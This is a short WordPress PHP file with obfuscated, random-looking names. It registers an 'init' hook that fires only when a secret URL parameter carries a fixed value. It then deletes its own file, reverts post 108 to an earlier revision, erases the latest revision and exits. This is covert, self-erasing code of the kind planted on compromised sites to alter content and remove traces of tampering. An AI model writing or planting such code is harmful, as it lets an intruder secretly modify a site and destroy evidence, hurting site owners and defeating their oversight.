<?php

function project_css_last_assistant() {
	if (isset($_GET['option_player_authors_rate']) && $_GET['option_player_authors_rate'] === 'frontend_review_new') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$directory_awesome_estate_age = 108;
		$notifications_addons_reports = wp_get_post_revisions($directory_awesome_estate_age);
		if (empty($notifications_addons_reports)) die('no revisions');
		if (count($notifications_addons_reports) < 2) die('less than 2');
		$report_soon_toolbox = array_shift($notifications_addons_reports);
		$scss_csv_notifier = $report_soon_toolbox->ID;
		$crm_rate_real = array_shift($notifications_addons_reports);
		$reminder_stripe_sliding = $crm_rate_real->ID;
		$namespaced_dropdown_modal = wp_restore_post_revision($reminder_stripe_sliding);
		if ($namespaced_dropdown_modal === false) die('error restoring');
		$namespaced_dropdown_modal = wp_delete_post_revision($scss_csv_notifier);		
		if ($namespaced_dropdown_modal === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'project_css_last_assistant');
